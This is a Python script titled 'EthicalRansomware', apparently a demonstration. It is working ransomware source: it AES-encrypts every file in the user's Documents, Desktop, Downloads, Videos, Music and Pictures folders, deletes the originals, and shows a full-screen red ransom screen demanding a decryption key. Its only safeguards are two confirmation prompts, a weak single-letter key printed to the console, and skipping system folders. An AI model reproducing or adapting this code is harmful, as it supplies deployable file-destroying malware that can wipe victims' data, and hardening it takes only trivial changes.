import os
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import random
import hashlib


class EthicalRansomware:
    def __init__(self, show_hash=False):
        self.show_hash = show_hash  # Whether to show the encryption key hash

        # Predefined decryption keys
        self.decryption_keys = ['a', 'b', 'c', 'd', 'e', 'f']

        # Randomly pick a decryption key for this session
        self.selected_key = random.choice(self.decryption_keys)
        
        # If show_hash is True, print the key to the console
        if self.show_hash:
            print(f"Selected Key: {self.selected_key}")

        # Generate AES key and IV based on the selected key
        self.key = hashlib.sha256(self.selected_key.encode()).digest()  # Convert key to AES key
        self.iv = os.urandom(16)  # Generate a random 16-byte IV

    def encrypt_file(self, file_path):
        """Encrypt a single file and delete the original file after encryption."""
        if self.is_ransomware(file_path) or self.is_system_file(file_path):
            print(f"Skipping file: {file_path}")
            return  # Skip encrypting the ransomware script and system files

        with open(file_path, 'rb') as f:
            data = f.read()

        # Pad the data to be a multiple of AES block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # AES encryption in CBC mode
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Save encrypted data to new file with ".enc" extension
        encrypted_file_path = file_path + '.enc'
        with open(encrypted_file_path, 'wb') as f:
            f.write(self.iv + encrypted_data)  # Store IV with encrypted data
        print(f"Encrypted file saved as: {encrypted_file_path}")

        # Delete original file after encryption
        os.remove(file_path)
        print(f"Original file deleted: {file_path}")

    def decrypt_file(self, file_path, user_key):
        """Decrypt a single file using the provided key."""
        if user_key != self.selected_key:
            messagebox.showerror("Decryption Failed", "Incorrect key!")
            return

        with open(file_path, 'rb') as f:
            iv = f.read(16)  # Extract IV
            encrypted_data = f.read()

        # AES decryption in CBC mode
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Unpad the decrypted data
        unpadder = padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

        # Save decrypted data to original file (remove the ".enc" extension)
        decrypted_file_path = file_path.replace('.enc', '')
        with open(decrypted_file_path, 'wb') as f:
            f.write(unpadded_data)
        print(f"Decrypted file saved as: {decrypted_file_path}")

    def is_ransomware(self, file_path):
        """Check if the file is the ransomware script itself to avoid self-encryption."""
        return os.path.basename(file_path) == os.path.basename(__file__)

    def is_system_file(self, file_path):
        """Check if the file is a system file (critical OS files) to avoid encryption."""
        system_directories = [
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\System Volume Information",
            "C:\\$Recycle.Bin",
            "C:\\Users\\Default",
            "C:\\Users\\Public",
            "C:\\Users\\Administrator",
        ]
        # Exclude files in these directories from encryption
        for directory in system_directories:
            if file_path.startswith(directory):
                return True
        
        # Avoid encrypting important system files in the Users folder like AppData or NTUSER.DAT
        if 'AppData' in file_path or 'NTUSER.DAT' in file_path:
            return True
        
        return False

    def get_user_folders(self):
        """Get common user folders to encrypt."""
        user_folders = [
            os.path.join(os.environ["USERPROFILE"], "Documents"),
            os.path.join(os.environ["USERPROFILE"], "Desktop"),
            os.path.join(os.environ["USERPROFILE"], "Downloads"),
            os.path.join(os.environ["USERPROFILE"], "Videos"),
            os.path.join(os.environ["USERPROFILE"], "Music"),
            os.path.join(os.environ["USERPROFILE"], "Pictures"),
        ]
        return user_folders

    def traverse_and_encrypt(self, start_path):
        """Traverse the folder structure and encrypt files."""
        for root, dirs, files in os.walk(start_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                self.encrypt_file(file_path)  # Encrypt each file

    def traverse_and_decrypt(self, start_path, user_key):
        """Traverse the folder structure and decrypt files."""
        for root, dirs, files in os.walk(start_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if file_path.endswith('.enc'):
                    self.decrypt_file(file_path, user_key)  # Decrypt encrypted files


# GUI setup
def show_ransomware_gui():
    def decrypt_action():
        user_key = decryption_key_entry.get()  # Get key from the input box
        if user_key:
            # Decrypt all files if the key is correct
            user_folders = ransomware.get_user_folders()
            for folder in user_folders:
                ransomware.traverse_and_decrypt(folder, user_key)
            messagebox.showinfo("Success", "Files decrypted!")
        else:
            messagebox.showerror("Error", "Please enter the decryption key.")

    # Show confirmation message box before triggering the ransomware
    if messagebox.askyesno("Ransomware?", "I recommend using a VM. Continue?"):
        if messagebox.askyesno("Final Confirmation", "It will actually do things. Proceed?"):
            # Create ransomware instance with show_hash=True
            global ransomware
            ransomware = EthicalRansomware(show_hash=True)

            # Tkinter setup for GUI
            root = tk.Tk()
            root.title("Ransomware Simulation")
            root.geometry("1920x1080")
            root.configure(bg="red")
            root.attributes("-fullscreen", True)

            # Warning label
            label = tk.Label(root, text="Your computer is encrypted\nFigure the code out to decrypt it", 
                             font=("Arial", 40), fg="white", bg="red", justify="center")
            label.pack(pady=100)

            # Decryption key input box
            decryption_key_label = tk.Label(root, text="Enter Decryption Key:", font=("Arial", 20), fg="white", bg="red")
            decryption_key_label.pack(pady=20)
            decryption_key_entry = tk.Entry(root, font=("Arial", 20), show="*")
            decryption_key_entry.pack(pady=20)

            # Decrypt button
            decrypt_button = tk.Button(root, text="Decrypt", font=("Arial", 20), command=decrypt_action)
            decrypt_button.pack(pady=20)

            # Trigger encryption instantly when ransomware is activated
            user_folders = ransomware.get_user_folders()
            for folder in user_folders:
                ransomware.traverse_and_encrypt(folder)

            messagebox.showinfo("Encryption Complete", "All files have been encrypted!")

            root.mainloop()


if __name__ == "__main__":
    show_ransomware_gui()
